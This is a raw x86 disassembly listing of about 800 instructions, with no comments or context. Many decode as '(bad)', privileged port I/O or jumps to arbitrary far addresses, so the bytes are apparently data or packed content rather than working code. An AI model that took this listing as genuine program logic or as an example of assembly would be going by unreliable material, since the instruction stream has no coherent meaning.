  40d09b:	sar    BYTE PTR [edi],cl
  40d09d:	push   ebp
  40d09e:	pop    eax
  40d09f:	pop    eax
  40d0a0:	pop    eax
  40d0a1:	ficomp DWORD PTR [eax-0x26bb85bb]
  40d0a7:	cmp    ch,bh
  40d0a9:	push   esp
  40d0aa:	ins    DWORD PTR es:[edi],dx
  40d0ab:	sbb    eax,DWORD PTR [ebx+eax*1+0x41]
  40d0af:	iret   
  40d0b0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40d0b2:	ret    0xe15b
  40d0b5:	(bad)  
  40d0b6:	inc    eax
  40d0b7:	in     eax,dx
  40d0b8:	js     0x40d061
  40d0ba:	mov    gs:0x2d3c2c1f,eax
  40d0c0:	xchg   ebp,eax
  40d0c1:	sbb    esi,DWORD PTR cs:[ebx]
  40d0c4:	sub    BYTE PTR [esp+edi*4-0x49454cb0],dh
  40d0cb:	inc    ecx
  40d0cc:	mov    ebx,0xeaaa0bb1
  40d0d1:	pop    esi
  40d0d2:	xchg   DWORD PTR [ebx+ebp*2],ebp
  40d0d5:	jg     0x40d124
  40d0d7:	(bad)  
  40d0d8:	inc    esp
  40d0d9:	cld    
  40d0da:	jmp    0xd1ee:0x7fd7e663
  40d0e1:	in     al,dx
  40d0e2:	mov    ecx,0xc2e37cb6
  40d0e7:	fisub  DWORD PTR [eax-0x5487f976]
  40d0ed:	add    BYTE PTR [edi],dh
  40d0ef:	mov    dh,0x20
  40d0f1:	in     al,dx
  40d0f2:	dec    edx
  40d0f3:	aaa    
  40d0f4:	fisubr DWORD PTR [ebp+0x81099fa]
  40d0fa:	add    BYTE PTR ds:0xda00bf97,bh
  40d100:	ins    DWORD PTR es:[edi],dx
  40d101:	(bad)  [edi+0x3b0b0849]
  40d107:	mov    edx,0xec2fbf8e
  40d10c:	add    BYTE PTR [esi],dl
  40d10e:	(bad)  
  40d10f:	cmp    edx,DWORD PTR [ebx-0x67]
  40d112:	jae    0x40d0a2
  40d114:	inc    esp
  40d115:	add    bh,dl
  40d117:	sub    al,0x6c
  40d119:	xchg   esp,eax
  40d11a:	fild   WORD PTR cs:[edi+0x20]
  40d11e:	ins    BYTE PTR es:[edi],dx
  40d11f:	clc    
  40d120:	and    bh,BYTE PTR fs:[ecx+0x5b2ed0b4]
  40d127:	dec    esp
  40d128:	in     eax,dx
  40d129:	inc    edi
  40d12a:	cmp    cl,BYTE PTR [eax+0x307444b0]
  40d130:	mov    cl,0x23
  40d132:	(bad)  
  40d133:	std    
  40d134:	jmp    0x40d0e9
  40d136:	jl     0x40d167
  40d138:	jecxz  0x40d13c
  40d13a:	fist   DWORD PTR [esi-0x36]
  40d13d:	jecxz  0x40d13d
  40d13f:	add    eax,0xfc05cf16
  40d144:	fimul  WORD PTR [edx]
  40d146:	(bad)  
  40d147:	mov    BYTE PTR [edx+0x1c],0x1d
  40d14b:	xor    edx,DWORD PTR [edi]
  40d14d:	aaa    
  40d14e:	sub    eax,0xd7dc0475
  40d153:	es fdiv st(6),st
  40d156:	cmpxchg BYTE PTR [ebx],dl
  40d159:	jecxz  0x40d131
  40d15b:	xchg   esi,eax
  40d15c:	sub    BYTE PTR cs:[edi],0x8a
  40d160:	mov    WORD PTR [edi+edx*1+0x4b42b1d7],es
  40d167:	ins    DWORD PTR es:[edi],dx
  40d168:	sub    esi,DWORD PTR [edx+ebx*2+0xe9d9b05]
  40d16f:	fldenv [edx-0x30]
  40d172:	adc    eax,0xd4c1b617
  40d177:	rcr    BYTE PTR [ecx],1
  40d179:	and    BYTE PTR [esi-0x13],ah
  40d17c:	in     al,0xd2
  40d17e:	(bad)  
  40d17f:	mov    dh,0x2c
  40d181:	jne    0x40d18a
  40d183:	add    ecx,DWORD PTR [ebp+0x56]
  40d186:	adc    eax,0x6d2d44c5
  40d18b:	sbb    ebp,ebp
  40d18d:	(bad)  
  40d18e:	sbb    al,0xa1
  40d190:	push   esp
  40d191:	enter  0x929e,0x71
  40d195:	xchg   BYTE PTR ds:0x4db6ed57,cl
  40d19b:	mov    ds:0xfecc8641,al
  40d1a0:	or     BYTE PTR [ebx],bl
  40d1a2:	imul   esi,DWORD PTR [edi-0x44b17a26],0x4f
  40d1a9:	(bad)  
  40d1aa:	imul   edx,DWORD PTR [ebp-0x24],0x2d
  40d1ae:	cmc    
  40d1af:	mov    al,0x4d
  40d1b1:	shl    BYTE PTR [esi+0x61],0x86
  40d1b5:	pop    esi
  40d1b6:	jmp    0x40d1e8
  40d1b8:	push   esi
  40d1b9:	mov    edi,0x6cb13858
  40d1be:	in     eax,dx
  40d1bf:	push   es
  40d1c0:	jno    0x40d17b
  40d1c2:	or     DWORD PTR [ebp+0x7d],0xd1b62035
  40d1c9:	push   esp
  40d1ca:	mov    ebx,0xd1ec76ba
  40d1cf:	ss ins BYTE PTR es:[edi],dx
  40d1d1:	push   esp
  40d1d2:	pop    edx
  40d1d3:	inc    edi
  40d1d4:	xchg   esi,eax
  40d1d5:	ss ficomp DWORD PTR ss:[ecx+esi*2-0xa930cca]
  40d1de:	dec    edx
  40d1df:	push   ebp
  40d1e0:	stos   DWORD PTR es:[edi],eax
  40d1e1:	mov    al,0x5c
  40d1e3:	ficom  DWORD PTR [edi]
  40d1e5:	push   0xffffffa1
  40d1e7:	ret    0x50db
  40d1ea:	jae    0x40d235
  40d1ec:	stos   BYTE PTR es:[edi],al
  40d1ed:	sub    eax,0x80546db7
  40d1f2:	stos   BYTE PTR es:[edi],al
  40d1f3:	cmp    BYTE PTR [edi-0x72ac538f],dh
  40d1f9:	lods   eax,DWORD PTR ds:[esi]
  40d1fa:	pop    ebp
  40d1fb:	pop    eax
  40d1fc:	jne    0x40d1d0
  40d1fe:	pop    es
  40d1ff:	rcl    BYTE PTR [ebp+0x2c],0x1a
  40d203:	(bad)  
  40d205:	fstp   st(2)
  40d207:	test   DWORD PTR [ebp+0x709e992e],ecx
  40d20d:	mov    edx,DWORD PTR [eax]
  40d20f:	gs sti 
  40d211:	or     DWORD PTR [edi],0xb0a9754d
  40d217:	push   eax
  40d218:	adc    eax,0x34d50216
  40d21d:	sub    BYTE PTR [eax+0xb6c10ab],0xfd
  40d224:	shr    DWORD PTR [ebp-0x4e11d93b],cl
  40d22a:	mov    al,0x35
  40d22c:	pop    edx
  40d22d:	push   edi
  40d22e:	jnp    0x40d26e
  40d230:	pop    ebp
  40d231:	dec    ecx
  40d232:	adc    al,0xc2
  40d234:	jbe    0x40d2a1
  40d236:	dec    ebx
  40d237:	jl     0x40d282
  40d239:	jmp    0xbcf784f
  40d23e:	sbb    bl,BYTE PTR [esi+0x44]
  40d241:	fild   DWORD PTR [ebp-0x2f8a4b73]
  40d247:	sub    BYTE PTR [edx+0x41],dh
  40d24a:	add    al,0x50
  40d24c:	jo     0x40d2c1
  40d24e:	xor    al,0x9a
  40d250:	cli    
  40d251:	xor    BYTE PTR [esi],ah
  40d253:	mov    esi,0x16a5da5b
  40d258:	aam    0x70
  40d25a:	xchg   esp,eax
  40d25b:	or     ecx,DWORD PTR [esi]
  40d25d:	jb     0x40d25b
  40d25f:	push   cs
  40d260:	(bad)  [eax]
  40d262:	ins    BYTE PTR es:[edi],dx
  40d263:	pop    ss
  40d264:	add    al,0xa4
  40d266:	ds dec edx
  40d268:	pop    es
  40d269:	dec    ebx
  40d26a:	push   ds
  40d26b:	mov    ch,0x9
  40d26d:	pop    ss
  40d26e:	shl    BYTE PTR [esi-0x73cafa4c],0xa9
  40d275:	out    0x38,al
  40d277:	jbe    0x40d22a
  40d279:	ins    DWORD PTR es:[edi],dx
  40d27a:	lea    ebx,[ebx+0x39]
  40d27d:	enter  0x1134,0x45
  40d281:	mov    eax,ss
  40d283:	outs   dx,BYTE PTR ds:[esi]
  40d284:	ss mov dh,0x85
  40d287:	push   edx
  40d288:	mov    ch,0x75
  40d28a:	(bad)  
  40d28b:	cld    
  40d28c:	jbe    0x40d240
  40d28e:	out    dx,eax
  40d28f:	iret   
  40d290:	mov    ch,0x71
  40d292:	mov    eax,ds:0x94a0f8dd
  40d297:	mov    bl,0x88
  40d299:	jo     0x40d293
  40d29b:	or     al,0xe5
  40d29d:	das    
  40d29e:	mov    edi,0x87e24740
  40d2a3:	pop    edx
  40d2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2a5:	test   BYTE PTR [eax],al
  40d2a7:	mov    ds:0xfb003dfc,eax
  40d2ac:	ins    DWORD PTR es:[edi],dx
  40d2ad:	test   eax,0xad589451
  40d2b2:	sbb    DWORD PTR [ebx],0x50
  40d2b5:	pop    ds
  40d2b6:	mov    edx,0x60a1d175
  40d2bb:	xchg   dl,ch
  40d2bd:	bound  esp,QWORD PTR [edx+0xbabbf31]
  40d2c3:	lods   eax,DWORD PTR ds:[esi]
  40d2c4:	fcomp  QWORD PTR [edx+0x68]
  40d2c7:	mov    ecx,0xcafaac25
  40d2cc:	dec    edx
  40d2cd:	xchg   BYTE PTR [esi-0x28],bl
  40d2d0:	adc    al,0xb7
  40d2d2:	push   esp
  40d2d3:	add    bh,BYTE PTR [eax+0x54]
  40d2d6:	add    al,0xe8
  40d2d8:	cmp    DWORD PTR [ebx+esi*1],ebx
  40d2db:	add    dh,cl
  40d2dd:	pop    esp
  40d2de:	pusha  
  40d2df:	imul   ebx,DWORD PTR [ebx-0x22],0xe0356617
  40d2e6:	jne    0x40d2ab
  40d2e8:	push   eax
  40d2e9:	or     ebx,ebx
  40d2eb:	push   esi
  40d2ec:	add    eax,DWORD PTR [edi]
  40d2ee:	rcl    ebx,0xe5
  40d2f1:	dec    ebp
  40d2f2:	jge    0x40d276
  40d2f4:	adc    DWORD PTR [ecx+edx*8+0x248c6d2e],esi
  40d2fb:	loopne 0x40d2fe
  40d2fd:	mov    ch,0x20
  40d2ff:	xchg   ebx,eax
  40d300:	add    al,0x55
  40d302:	fistp  DWORD PTR [eax-0x48]
  40d305:	xchg   BYTE PTR [esi+0x2a],dh
  40d308:	add    al,0x28
  40d30a:	cmp    DWORD PTR [ebx-0x41],ebp
  40d30d:	lea    eax,[ebp-0x103a368a]
  40d313:	loop   0x40d32a
  40d315:	inc    ecx
  40d316:	rol    DWORD PTR [edi-0x31],0x30
  40d31a:	cwde   
  40d31b:	fcmovbe st,st(6)
  40d31d:	cmc    
  40d31e:	ja     0x40d2ae
  40d320:	sub    esp,DWORD PTR [ebx]
  40d322:	mov    al,0x79
  40d324:	jmp    0xe96689ff
  40d329:	inc    esp
  40d32a:	gs cwde 
  40d32c:	or     ebp,DWORD PTR [edx-0x3d585903]
  40d332:	mov    dh,0x6d
  40d334:	ins    DWORD PTR es:[edi],dx
  40d335:	mov    BYTE PTR [eax],cl
  40d337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d338:	xchg   ebp,eax
  40d339:	sub    DWORD PTR [edx-0x4d],ebp
  40d33c:	sbb    cl,al
  40d33e:	pop    ebp
  40d33f:	call   0x970cc0e6
  40d344:	push   esi
  40d345:	jge    0x40d33f
  40d347:	pop    ebp
  40d348:	sar    esp,cl
  40d34a:	aad    0x6d
  40d34c:	push   ebx
  40d34d:	jne    0x40d2f2
  40d34f:	mov    eax,ds:0x30cfc766
  40d354:	daa    
  40d355:	mov    esi,0x6de02bf5
  40d35a:	push   esp
  40d35b:	addr16 mov cl,0xef
  40d35e:	iret   
  40d35f:	add    BYTE PTR [ebp+0x43df768d],0x89
  40d366:	nop
  40d367:	pop    esi
  40d368:	add    DWORD PTR [ecx],ecx
  40d36a:	fsubr  DWORD PTR [eax+0x5]
  40d36d:	adc    al,0xbf
  40d36f:	int3   
  40d370:	aas    
  40d371:	dec    edx
  40d372:	lods   eax,DWORD PTR ds:[esi]
  40d373:	test   DWORD PTR [edx+0x26c26a5d],esi
  40d379:	lds    ebx,FWORD PTR [eax+0x51dc4449]
  40d37f:	pop    ss
  40d380:	fidiv  DWORD PTR ss:[ebx-0x2]
  40d384:	mov    dh,0xdb
  40d386:	jnp    0x40d3d7
  40d388:	jmp    0x40d34f
  40d38a:	ins    DWORD PTR es:[edi],dx
  40d38b:	ins    DWORD PTR es:[edi],dx
  40d38c:	pop    ebx
  40d38d:	ficomp DWORD PTR [eax+eiz*2+0x32978ff9]
  40d394:	fcomp  DWORD PTR [eax+0x12b6408c]
  40d39a:	sub    al,0xb4
  40d39c:	sbb    bl,BYTE PTR [esi-0x26]
  40d39f:	fs (bad) 
  40d3a1:	clc    
  40d3a2:	sbb    al,0xa1
  40d3a4:	push   ecx
  40d3a5:	sub    eax,0xefd66edc
  40d3aa:	or     dl,bl
  40d3ac:	add    al,0xe8
  40d3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3af:	lea    ebp,[ebp-0x68ff4284]
  40d3b5:	or     BYTE PTR [edi-0x3f],bl
  40d3b8:	fcom   st(1)
  40d3ba:	shl    DWORD PTR [esi-0x4549248a],1
  40d3c0:	pop    esp
  40d3c1:	fadd   DWORD PTR [edx]
  40d3c3:	cmp    ch,BYTE PTR [eax-0x34]
  40d3c6:	rcl    bh,0xbf
  40d3c9:	lock ss aam 0x76
  40d3cd:	(bad)  
  40d3cf:	jecxz  0x40d3ee
  40d3d1:	(bad)  
  40d3d2:	or     DWORD PTR [edi],ebp
  40d3d4:	push   ds
  40d3d5:	(bad)  
  40d3d6:	retf   0x9694
  40d3d9:	fisubr DWORD PTR [ebp+0x35735da3]
  40d3df:	outs   dx,DWORD PTR ds:[esi]
  40d3e0:	mov    DWORD PTR [eax-0x4fbbb44d],ebx
  40d3e6:	fstp   st(0)
  40d3e8:	sub    DWORD PTR [edx+0xf],ecx
  40d3eb:	and    al,BYTE PTR [eax-0x48975fce]
  40d3f1:	inc    esi
  40d3f2:	ror    BYTE PTR [esi+eiz*2],1
  40d3f5:	out    dx,al
  40d3f6:	push   esi
  40d3f7:	addr16 pminub mm3,mm3
  40d3fb:	lods   eax,DWORD PTR ds:[esi]
  40d3fc:	pop    ebp
  40d3fd:	pop    edx
  40d3fe:	jl     0x40d457
  40d400:	xchg   edx,eax
  40d401:	imul   esi,edi,0xae6d7126
  40d407:	(bad)
  40d40a:	pusha  
  40d40b:	fistp  DWORD PTR [edx]
  40d40d:	nop
  40d40e:	mov    eax,ds:0x5c23862
  40d413:	dec    ebp
  40d414:	add    ebp,DWORD PTR [ebp-0x35952253]
  40d41a:	adc    BYTE PTR [esi*8+0x6decdd1a],dh
  40d421:	push   0xffffffb7
  40d423:	mov    dl,0xc5
  40d425:	arpl   WORD PTR [ecx+0x245c9c33],bx
  40d42b:	lods   al,BYTE PTR ds:[esi]
  40d42c:	xor    dl,bh
  40d42e:	jbe    0x40d491
  40d430:	pop    ebx
  40d431:	(bad)  
  40d432:	xor    ch,bh
  40d434:	adc    DWORD PTR [ebp+0x3e],edx
  40d437:	mov    dl,0xf2
  40d439:	retf   0xe091
  40d43c:	(bad)  
  40d43d:	(bad)  
  40d43e:	ret    0x1c60
  40d441:	mov    ebx,0xd4e48e1c
  40d446:	loop   0x40d3df
  40d448:	or     bl,bl
  40d44a:	push   cs
  40d44b:	cmp    BYTE PTR [eax+0x63],bh
  40d44e:	xlat   BYTE PTR ds:[ebx]
  40d44f:	jle    0x40d4af
  40d451:	inc    BYTE PTR [ebx]
  40d453:	xchg   ebx,eax
  40d454:	or     ebp,DWORD PTR [ebp-0x658e9525]
  40d45a:	mov    dl,0x35
  40d45c:	adc    ebx,DWORD PTR [ebx-0x5272f03f]
  40d462:	add    al,0xb5
  40d464:	mov    BYTE PTR [ecx+0x0],al
  40d467:	sub    ebp,ebx
  40d469:	mov    ebp,0xa5c2b76a
  40d46e:	lahf   
  40d46f:	sbb    cl,BYTE PTR [ebx]
  40d471:	xor    bl,BYTE PTR [edx-0x4655f0b]
  40d477:	je     0x40d41a
  40d479:	mov    al,0x5d
  40d47b:	and    eax,DWORD PTR [esi]
  40d47d:	jmp    FWORD PTR [edx+ebx*8]
  40d480:	pop    ebx
  40d481:	shr    DWORD PTR [ebx],cl
  40d483:	out    0xed,eax
  40d485:	imul   edx,DWORD PTR [edi-0x4c],0x4e4340f5
  40d48c:	push   eax
  40d48d:	cmp    BYTE PTR [ebp+0x1a],al
  40d490:	(bad)  [esi+0xe47b76d]
  40d496:	jo     0x40d488
  40d498:	sahf   
  40d499:	cmp    BYTE PTR [eax-0x164ce89c],dh
  40d49f:	fcomp  QWORD PTR [ebx-0x55]
  40d4a2:	pop    edx
  40d4a3:	push   0xffffff9b
  40d4a5:	add    bl,dh
  40d4a7:	jge    0x40d508
  40d4a9:	test   DWORD PTR [esi-0x79912eae],esi
  40d4af:	cmp    esp,DWORD PTR [ecx-0x2d76da65]
  40d4b5:	(bad)  
  40d4b6:	xchg   esi,eax
  40d4b7:	outs   dx,BYTE PTR ds:[esi]
  40d4b8:	es scas eax,DWORD PTR es:[edi]
  40d4ba:	and    al,al
  40d4bc:	jp     0x40d464
  40d4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4bf:	or     edx,DWORD PTR [ecx]
  40d4c1:	loope  0x40d485
  40d4c3:	(bad)  
  40d4c4:	mov    cl,0xcf
  40d4c7:	iret   
  40d4c8:	shr    DWORD PTR [esi],cl
  40d4ca:	out    dx,al
  40d4cb:	adc    eax,DWORD PTR [esi+0x6d8206b8]
  40d4d1:	imul   edi,DWORD PTR [ecx-0x13a61329],0xed6c2d7d
  40d4db:	rol    DWORD PTR [esi+0x1784a401],cl
  40d4e1:	gs and ecx,ecx
  40d4e4:	jo     0x40d559
  40d4e6:	push   ecx
  40d4e7:	pop    esp
  40d4e8:	fmul   st,st(0)
  40d4ea:	es push ebp
  40d4ec:	icebp  
  40d4ed:	mov    edi,ebp
  40d4ef:	or     dh,BYTE PTR [ebp+0x7dd6d2ed]
  40d4f5:	retf   0xa25f
  40d4f8:	inc    edi
  40d4f9:	sbb    DWORD PTR [ecx+eiz*4+0x4da068c5],eax
  40d500:	aam    0x16
  40d502:	xor    eax,0x42de4060
  40d507:	jne    0x40d574
  40d509:	imul   ebx,DWORD PTR [ebx+0x117f992d],0x50
  40d510:	lods   al,BYTE PTR ds:[esi]
  40d511:	sbb    al,0xce
  40d513:	cli    
  40d514:	fidiv  DWORD PTR [esi+0x59eea96d]
  40d51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d51b:	lods   eax,DWORD PTR ds:[esi]
  40d51c:	pop    edi
  40d51d:	fwait
  40d51e:	pop    eax
  40d51f:	das    
  40d520:	mov    edx,0xa96d5779
  40d525:	sub    DWORD PTR [edx+0x243ebc],0xddaa8ea
  40d52f:	rol    DWORD PTR [edx-0x5a],cl
  40d532:	repz aam 0xa2
  40d535:	sub    ecx,edi
  40d537:	jmp    0x1656ec16
  40d53c:	adc    BYTE PTR [eax-0x33],ah
  40d53f:	outs   dx,DWORD PTR ds:[esi]
  40d540:	dec    edi
  40d541:	dec    ecx
  40d542:	sbb    bh,BYTE PTR [ecx]
  40d544:	shr    BYTE PTR [ebp-0x5d],1
  40d547:	pop    ebp
  40d548:	jno    0x40d592
  40d54a:	and    BYTE PTR [edx],al
  40d54c:	and    DWORD PTR [edx-0x59],esi
  40d54f:	cld    
  40d550:	ins    BYTE PTR es:[edi],dx
  40d551:	xchg   al,bl
  40d553:	outs   dx,BYTE PTR ds:[esi]
  40d554:	or     eax,0xebdd8e95
  40d559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55a:	aam    0x9f
  40d55c:	mov    ds:0x82582e0a,al
  40d561:	or     ecx,eax
  40d563:	xchg   BYTE PTR [eax-0x449291f2],bh
  40d569:	adc    eax,0x89226252
  40d56e:	sbb    DWORD PTR [ecx-0x3ff24950],0x5b
  40d575:	imul   ebx,ebx,0xffffffda
  40d578:	sbb    al,cl
  40d57a:	popf   
  40d57b:	mov    edx,0x771c9ec8
  40d580:	cmp    al,0x56
  40d582:	or     cl,BYTE PTR [edx+0x4]
  40d585:	sub    eax,0xe16126b4
  40d58a:	imul   esp,ebx,0x7
  40d58d:	rcr    BYTE PTR [edx-0x72],1
  40d590:	mov    ebx,0xd77d318
  40d595:	mov    dh,0xdd
  40d597:	fisubr DWORD PTR [ebp+0x7c]
  40d59a:	je     0x40d5e4
  40d59c:	lods   al,BYTE PTR ds:[esi]
  40d59d:	mov    edi,0x325cef71
  40d5a2:	cwde   
  40d5a3:	ret    0x1ada
  40d5a6:	test   DWORD PTR [ecx-0x1031432a],ecx
  40d5ac:	mov    ch,0x5d
  40d5ae:	fcomp  DWORD PTR [eax-0x47]
  40d5b1:	mov    bl,0xe1
  40d5b3:	fadd   st,st(7)
  40d5b5:	xor    BYTE PTR [edi-0xb],0x22
  40d5b9:	lea    ecx,[ebp-0x2b]
  40d5bc:	pop    ss
  40d5bd:	int3   
  40d5be:	add    cl,BYTE PTR [edx-0x7a0c835a]
  40d5c4:	push   es
  40d5c5:	sbb    BYTE PTR [ebx],0xf
  40d5c8:	scas   eax,DWORD PTR es:[edi]
  40d5c9:	jb     0x40d61e
  40d5cb:	jmp    0x40d594
  40d5cd:	movzx  esi,WORD PTR [esi-0x79cba87b]
  40d5d4:	and    edi,edx
  40d5d6:	sub    esi,edi
  40d5d8:	push   esp
  40d5d9:	inc    ebx
  40d5da:	xor    BYTE PTR [ecx+eax*8],0xed
  40d5de:	mov    eax,ds:0xaac2325f
  40d5e3:	sahf   
  40d5e4:	pop    ebp
  40d5e5:	sbb    eax,0x82e7422c
  40d5ea:	cs jl  0x40d5ea
  40d5ed:	ins    BYTE PTR es:[edi],dx
  40d5ee:	repnz xor eax,0xba37976e
  40d5f4:	stos   BYTE PTR es:[edi],al
  40d5f5:	in     eax,dx
  40d5f6:	or     al,0xa5
  40d5f8:	adc    al,0x95
  40d5fa:	push   esi
  40d5fb:	add    DWORD PTR [edi+0x5d6c5ee3],eax
  40d601:	adc    BYTE PTR [ebx],bl
  40d603:	mov    ah,0x60
  40d605:	repz xor al,0x5f
  40d608:	repnz ins BYTE PTR es:[edi],dx
  40d60a:	pop    ebx
  40d60b:	mov    ebx,0xd4e27e6d
  40d610:	jb     0x40d596
  40d612:	lods   eax,DWORD PTR ds:[esi]
  40d613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d614:	das    
  40d615:	retf   
  40d616:	or     al,BYTE PTR [ecx]
  40d618:	or     eax,0x70ee2b55
  40d61d:	out    dx,eax
  40d61e:	ficomp DWORD PTR [ebp+0x10]
  40d621:	pop    ebx
  40d622:	or     ecx,esp
  40d624:	loopne 0x40d696
  40d626:	es lahf 
  40d628:	mov    edi,0xa83b05d6
  40d62d:	and    eax,0x82a87a3b
  40d632:	xchg   edx,eax
  40d633:	push   ds
  40d634:	pop    ebx
  40d635:	fld    TBYTE PTR [esi-0x13]
  40d638:	mov    eax,0xacf8771a
  40d63d:	sbb    eax,0xd1ce293b
  40d642:	imul   edx,DWORD PTR [eax+esi*4],0xfffffffd
  40d646:	outs   dx,BYTE PTR ds:[esi]
  40d647:	or     esi,DWORD PTR [ebx+ebx*8-0x23]
  40d64b:	pop    esi
  40d64c:	enter  0xe58c,0xb7
  40d650:	mov    dh,0xfd
  40d652:	fiadd  DWORD PTR [edx-0x75838335]
  40d658:	push   ds
  40d659:	add    bl,BYTE PTR [edi]
  40d65b:	mov    edi,0xdd45d626
  40d660:	sub    BYTE PTR [edi+0x6d],dl
  40d663:	outs   dx,BYTE PTR ds:[esi]
  40d664:	and    al,0xe2
  40d666:	stc    
  40d667:	loopne 0x40d6a2
  40d669:	pop    ebx
  40d66a:	or     eax,0x5c53a975
  40d66f:	pushf  
  40d670:	jmp    0x40d642
  40d672:	mov    bl,0x4
  40d674:	pop    edx
  40d675:	pop    ebx
  40d676:	pop    ebx
  40d677:	dec    ebx
  40d678:	pop    ebx
  40d679:	jg     0x40d638
  40d67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d67c:	mov    WORD PTR [edx-0x1b],gs
  40d67f:	jns    0x40d612
  40d681:	or     eax,0xa81bbeb6
  40d686:	sti    
  40d687:	je     0x40d654
  40d689:	clc    
  40d68a:	adc    esi,ebx
  40d68c:	xor    eax,0xb6174a37
  40d691:	mov    ecx,0x53c4986b
  40d696:	dec    edi
  40d697:	es leave 
  40d699:	cs jbe 0x40d709
  40d69c:	imul   ebx,ebx,0x8ad94a45
  40d6a2:	dec    edx
  40d6a3:	popa   
  40d6a4:	cwde   
  40d6a5:	in     al,dx
  40d6a6:	inc    edi
  40d6a7:	fld    TBYTE PTR [ebp+0x2b]
  40d6aa:	inc    eax
  40d6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6ac:	into   
  40d6ad:	jnp    0x40d6c6
  40d6af:	std    
  40d6b0:	mov    bh,0x77
  40d6b2:	xchg   DWORD PTR [esi],esi
  40d6b4:	ss dec edx
  40d6b6:	or     eax,edi
  40d6b8:	in     al,0x2
  40d6ba:	lahf   
  40d6bb:	and    eax,0x1b6c4400
  40d6c0:	inc    ebp
  40d6c1:	fild   DWORD PTR [esi-0x49033da3]
  40d6c7:	cmc    
  40d6c8:	mov    al,0x9
  40d6ca:	fadd   DWORD PTR [eax-0x69b765fd]
  40d6d0:	or     ch,BYTE PTR [ebp+0x1942e281]
  40d6d6:	inc    edi
  40d6d7:	dec    esp
  40d6d8:	test   eax,0xf8585ffc
  40d6dd:	lds    ebp,FWORD PTR [ebp-0x67868901]
  40d6e3:	xchg   DWORD PTR [edi],eax
  40d6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e6:	xchg   edi,eax
  40d6e7:	mov    ds:0xd85b41ba,eax
  40d6ec:	test   BYTE PTR [ebp-0x52f74e4e],al
  40d6f2:	inc    edx
  40d6f3:	xor    BYTE PTR [ebp+0x61],ch
  40d6f6:	imul   ebx,DWORD PTR [edi],0xffffffa7
  40d6f9:	out    dx,al
  40d6fa:	mul    DWORD PTR [eax]
  40d6fc:	inc    ecx
  40d6fd:	add    eax,0xedda08df
  40d702:	test   cl,0xa5
  40d705:	inc    esp
  40d706:	lds    edi,FWORD PTR [eax-0x50]
  40d709:	pop    ss
  40d70a:	xchg   esi,eax
  40d70b:	cmp    ch,ch
  40d70d:	pusha  
  40d70e:	sbb    ch,BYTE PTR [esi]
  40d710:	mov    cl,0x2d
  40d712:	ins    DWORD PTR es:[edi],dx
  40d713:	mov    esp,cs
  40d715:	out    0xf9,al
  40d717:	pop    ss
  40d718:	shl    DWORD PTR [esi-0x25],1
  40d71b:	pop    es
  40d71c:	mov    edx,0xae36d4b5
  40d721:	inc    eax
  40d722:	out    0x7d,al
  40d724:	mov    eax,0x1a824325
  40d729:	lea    eax,[edx-0x25]
  40d72c:	mov    ds:0xbb464d89,eax
  40d731:	aas    
  40d732:	push   edx
  40d733:	mov    ds:0x1b6bdb62,eax
  40d738:	cwde   
  40d739:	xchg   esi,eax
  40d73a:	jecxz  0x40d6e3
  40d73c:	mov    dh,0xb5
  40d73e:	in     eax,dx
  40d73f:	ret    0x7333
  40d742:	adc    ah,dh
  40d744:	xor    dh,BYTE PTR [ecx-0x5c]
  40d747:	retf   
  40d748:	(bad)  
  40d749:	bound  esi,QWORD PTR [esi+0x15dbb45b]
  40d74f:	sub    DWORD PTR [ecx],ecx
  40d751:	fwait
  40d752:	add    bl,BYTE PTR [eax+edi*1-0x1f071c86]
  40d759:	inc    edx
  40d75a:	mov    ebx,0x6ec79bd0
  40d75f:	aad    0xad
  40d761:	cmp    eax,0x1a360c56
  40d766:	pop    ss
  40d767:	call   0x4bf4:0x6daf79f5
  40d76e:	push   esp
  40d76f:	xor    al,0x61
  40d771:	mov    ebx,edx
  40d773:	xchg   esi,eax
  40d774:	mov    DWORD PTR [ebp-0x6b],edi
  40d777:	jbe    0x40d75a
  40d779:	xor    al,0x70
  40d77b:	mov    dh,0x12
  40d77d:	mov    ah,0x41
  40d77f:	clc    
  40d780:	jne    0x40d7a3
  40d782:	sbb    eax,0x6976850a
  40d787:	fld    TBYTE PTR [edx+0x57841c6]
  40d78d:	adc    al,0x6e
  40d78f:	mov    ecx,0x5d850b1f
  40d794:	shl    BYTE PTR [edx+0x12],0x69
  40d798:	mov    al,0x70
  40d79a:	add    DWORD PTR [ebp-0x75],ebp
  40d79d:	ins    DWORD PTR es:[edi],dx
  40d79e:	dec    ebx
  40d79f:	or     ecx,DWORD PTR [ebx-0x5f]
  40d7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a3:	push   ebp
  40d7a4:	xchg   esp,eax
  40d7a5:	sbb    eax,0x1192ef95
  40d7aa:	or     eax,ebp
  40d7ac:	mov    dh,0x5
  40d7ae:	fs push cs
  40d7b0:	cmp    BYTE PTR [ebp-0x492f92fc],0xd
  40d7b7:	mov    al,0x6b
  40d7b9:	cli    
  40d7ba:	dec    edx
  40d7bb:	mov    bl,0x62
  40d7bd:	(bad)  
  40d7be:	out    0xbb,al
  40d7c0:	mov    cl,0x6d
  40d7c2:	ins    BYTE PTR es:[edi],dx
  40d7c3:	cli    
  40d7c4:	lods   al,BYTE PTR ds:[esi]
  40d7c5:	dec    esi
  40d7c6:	jo     0x40d806
  40d7c8:	inc    ecx
  40d7c9:	sbb    BYTE PTR [eax+0x56],bl
  40d7cc:	jp     0x40d768
  40d7ce:	sbb    bl,0x42
  40d7d1:	jbe    0x40d7d6
  40d7d3:	xchg   BYTE PTR [ecx],bl
  40d7d5:	push   0xfffffff6
  40d7d7:	pop    eax
  40d7d8:	adc    dh,0x76
  40d7db:	fild   DWORD PTR [edi+0x4e]
  40d7de:	gs push 0xffffffac
  40d7e1:	mov    eax,ds:0x16160448
  40d7e6:	or     al,0xb5
  40d7e8:	(bad)  
